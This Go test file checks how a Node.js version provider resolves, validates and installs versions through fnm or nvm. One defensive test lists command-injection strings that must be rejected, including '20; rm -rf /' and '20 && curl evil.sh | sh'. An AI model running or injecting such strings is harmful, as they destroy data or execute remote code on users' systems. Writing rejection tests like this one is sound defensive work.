package providers

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"
)

func newNode(t *testing.T, r *fakeRunner, repoDir string) *NodeProvider {
	t.Helper()
	d, _ := testDeps(r, filepath.Join(t.TempDir(), "cache.json"))
	n := NewNode(d, repoDir, t.TempDir())
	n.Getenv = func(string) string { return "" }
	return n
}

// Phase 7: the node provider resolves a version from version_file and from version, with the
// explicit one winning.
func TestNodeVersionResolution(t *testing.T) {
	t.Parallel()
	repo := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(repo, ".nvmrc"), []byte("v18.19.0\n"), 0o644))

	r := newFakeRunner("node", "fnm")
	r.Out["node -v"] = "v16.0.0\n"
	n := newNode(t, r, repo)

	require.NoError(t, n.InstallVersion(context.Background(), "", ".nvmrc", InstallOptions{}))
	require.True(t, r.ran("fnm install 18.19.0"), "the leading v is stripped: %v", r.commands())

	r = newFakeRunner("node", "fnm")
	r.Out["node -v"] = "v16.0.0\n"
	n = newNode(t, r, repo)
	require.NoError(t, n.InstallVersion(context.Background(), "20.11.0", ".nvmrc", InstallOptions{}))
	require.True(t, r.ran("fnm install 20.11.0"), "an explicit version wins over the file")
}

// Phase 7: "20" matches "20.11.0" — a manifest pinning a major line must not churn on patches.
func TestNodePrefixMatch(t *testing.T) {
	t.Parallel()
	r := newFakeRunner("node", "fnm")
	r.Out["node -v"] = "v20.11.0\n"
	n := newNode(t, r, t.TempDir())

	require.NoError(t, n.InstallVersion(context.Background(), "20", "", InstallOptions{}))
	require.False(t, r.ran("fnm install 20"), "the running version already satisfies the target")

	installed, err := n.IsInstalled(context.Background(), "v20")
	require.NoError(t, err)
	require.True(t, installed)

	installed, err = n.IsInstalled(context.Background(), "18")
	require.NoError(t, err)
	require.False(t, installed)
}

// Phase 7: a version failing ^v?\d+(\.\d+)*$ is rejected before the nvm shell path is touched.
func TestNodeRejectsUnsafeVersions(t *testing.T) {
	t.Parallel()
	for _, bad := range []string{
		"20; rm -rf /",
		"$(whoami)",
		"latest",
		"20.x",
		"`id`",
		"20 && curl evil.sh | sh",
	} {
		r := newFakeRunner("node", "fnm")
		r.Out["node -v"] = "v16.0.0\n"
		n := newNode(t, r, t.TempDir())

		err := n.InstallVersion(context.Background(), bad, "", InstallOptions{})
		require.ErrorIs(t, err, ErrBadNodeVersion, "%q must be rejected", bad)
		require.Empty(t, r.commands(), "nothing may run before the version is validated")
	}
}

func TestNodeAcceptsWellFormedVersions(t *testing.T) {
	t.Parallel()
	for _, good := range []string{"20", "20.11", "20.11.0", "v20.11.0"} {
		r := newFakeRunner("node", "fnm")
		r.Out["node -v"] = "v16.0.0\n"
		n := newNode(t, r, t.TempDir())
		require.NoError(t, n.InstallVersion(context.Background(), good, "", InstallOptions{}), good)
	}
}

// Phase 7: a missing version file is a warning plus a skip, not an error.
func TestNodeMissingVersionFileIsSkipped(t *testing.T) {
	t.Parallel()
	r := newFakeRunner("node")
	n := newNode(t, r, t.TempDir())

	require.NoError(t, n.InstallVersion(context.Background(), "", ".nvmrc", InstallOptions{}))
	require.Empty(t, r.commands())
}

func TestNodeNoTargetIsSkipped(t *testing.T) {
	t.Parallel()
	r := newFakeRunner("node")
	n := newNode(t, r, t.TempDir())
	require.NoError(t, n.InstallVersion(context.Background(), "", "", InstallOptions{}))
	require.Empty(t, r.commands())
	require.NoError(t, n.Install(context.Background(), nil, InstallOptions{}))
}

func TestNodeDryRunInstallsNothing(t *testing.T) {
	t.Parallel()
	r := newFakeRunner("node", "fnm")
	r.Out["node -v"] = "v16.0.0\n"
	n := newNode(t, r, t.TempDir())

	require.NoError(t, n.InstallVersion(context.Background(), "20.11.0", "", InstallOptions{DryRun: true}))
	require.False(t, r.ran("fnm install 20.11.0"))
}

// nvm is a shell function, so it is the one place rv runs a shell — and only with a version that
// already passed the whitelist.
func TestNodeFallsBackToNvm(t *testing.T) {
	t.Parallel()
	nvmDir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(nvmDir, "nvm.sh"), []byte("# nvm"), 0o644))

	r := newFakeRunner("node") // no fnm
	r.Out["node -v"] = "v16.0.0\n"
	n := newNode(t, r, t.TempDir())
	n.Getenv = func(k string) string {
		if k == "NVM_DIR" {
			return nvmDir
		}
		return ""
	}

	require.NoError(t, n.InstallVersion(context.Background(), "20.11.0", "", InstallOptions{}))
	require.True(t, r.ran("bash -c . "+filepath.Join(nvmDir, "nvm.sh")+" && nvm install 20.11.0"),
		"%v", r.commands())
}

func TestNodeFallsBackToNvmWhenFnmFails(t *testing.T) {
	t.Parallel()
	nvmDir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(nvmDir, "nvm.sh"), []byte("# nvm"), 0o644))

	r := newFakeRunner("node", "fnm")
	r.Out["node -v"] = "v16.0.0\n"
	r.Fail["fnm install 20.11.0"] = errors.New("fnm exploded")
	n := newNode(t, r, t.TempDir())
	n.Getenv = func(k string) string {
		if k == "NVM_DIR" {
			return nvmDir
		}
		return ""
	}

	require.NoError(t, n.InstallVersion(context.Background(), "20.11.0", "", InstallOptions{}))
	require.True(t, r.ran("bash -c . "+filepath.Join(nvmDir, "nvm.sh")+" && nvm install 20.11.0"))
}

// NVM_DIR defaults to ~/.nvm.
func TestNodeDefaultNvmDir(t *testing.T) {
	t.Parallel()
	home := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(home, ".nvm"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(home, ".nvm", "nvm.sh"), []byte("# nvm"), 0o644))

	r := newFakeRunner("node")
	r.Out["node -v"] = "v16.0.0\n"
	d, _ := testDeps(r, filepath.Join(t.TempDir(), "cache.json"))
	n := NewNode(d, t.TempDir(), home)
	n.Getenv = func(string) string { return "" }

	require.NoError(t, n.InstallVersion(context.Background(), "20.11.0", "", InstallOptions{}))
	require.True(t, r.ran("bash -c . "+filepath.Join(home, ".nvm", "nvm.sh")+" && nvm install 20.11.0"))
}

func TestNodeWithNoManagerErrors(t *testing.T) {
	t.Parallel()
	r := newFakeRunner("node")
	r.Out["node -v"] = "v16.0.0\n"
	n := newNode(t, r, t.TempDir())

	err := n.InstallVersion(context.Background(), "20.11.0", "", InstallOptions{})
	require.ErrorIs(t, err, ErrProvider)
	require.Contains(t, err.Error(), "16.0.0", "the error must name the current version")
	require.Contains(t, err.Error(), "20.11.0", "and the target")
}

func TestNodeAbsentReportsNoCurrentVersion(t *testing.T) {
	t.Parallel()
	r := newFakeRunner("fnm") // node itself is not installed
	n := newNode(t, r, t.TempDir())

	require.False(t, n.IsAvailable())
	installed, err := n.IsInstalled(context.Background(), "20")
	require.NoError(t, err)
	require.False(t, installed)

	require.NoError(t, n.InstallVersion(context.Background(), "20.11.0", "", InstallOptions{}))
	require.True(t, r.ran("fnm install 20.11.0"))
}

func TestNodeVersionCommandFailureIsTreatedAsAbsent(t *testing.T) {
	t.Parallel()
	r := newFakeRunner("node", "fnm")
	r.Fail["node -v"] = errors.New("node crashed")
	n := newNode(t, r, t.TempDir())

	require.NoError(t, n.InstallVersion(context.Background(), "20.11.0", "", InstallOptions{}))
	require.True(t, r.ran("fnm install 20.11.0"))
}

func TestNodeName(t *testing.T) {
	t.Parallel()
	require.Equal(t, "node", newNode(t, newFakeRunner(), t.TempDir()).Name())
}
